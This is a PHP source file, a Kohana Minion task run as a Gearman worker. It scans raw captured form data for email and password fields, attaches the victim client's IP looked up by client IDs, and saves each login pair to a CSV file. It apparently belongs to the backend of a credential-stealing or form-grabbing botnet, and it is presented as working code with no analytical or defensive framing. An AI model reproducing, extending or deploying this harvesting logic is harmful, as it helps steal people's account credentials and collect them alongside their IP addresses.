<?php defined('SYSPATH') or die('No direct script access.');

class Task_Parser_Abc_All extends Minion_Task {

    protected function _execute(array $params){
	    Task_Helper::createWorker('Parser:Abc', $this);
    }

    public function Worker(GearmanJob $job){
        $array = json_decode($job->workload(), true);
        $data = $array['unknown'];

        if( strpos($data, '@') !== false && strpos($data, 'pas') !== false && strpos($data, 'mail') !== false ){
            $result = array();
            parse_str($data, $url);
            foreach($url as $k => $v){
                if(gettype($k) == 'string' && gettype($v) == 'string'){
                    if( strpos($k, '@') !== false || strpos($v, '@') !== false || strpos($k, 'mail') !== false || strpos($v, 'mail') !== false){
                        $result['mail'] = $v;
                    }
                    if( strpos($k, 'pas') !== false || strpos($v, 'pas') !== false ){
                        $result['pas'] = $v;
                    }
                }
            }
            if(count($result) == 2){
                $this->ClientInfo($array['cid0'], $array['cid1']);
                array_unshift($result, $this->ip);
                $name = md5(uniqid(mt_rand(), true));
                $fp = fopen('/home/abc/all/'.$name.'.csv', 'w');
                fputcsv($fp, $result);
                fclose($fp);
            }
        }
    }


    function ClientInfo($cid0, $cid1){
        $client = Task_Helper::getAdminClient();
        $client->setCompleteCallback([$this, 'CallbackClientInfo']);
        $needle_for_info = json_encode([
            'cid0' => $cid0,
            'cid1' => $cid1
        ]);
        $client->addTask("ClientInfo", $needle_for_info, null, md5($needle_for_info));
        $client->runTasks();
    }

    function CallbackClientInfo($task){
        if ($task->data()) {
            $client = json_decode($task->data(), true);
            $this->ip =  $client['ip'];
        }else{
            $this->ip = false;
        }
    }
}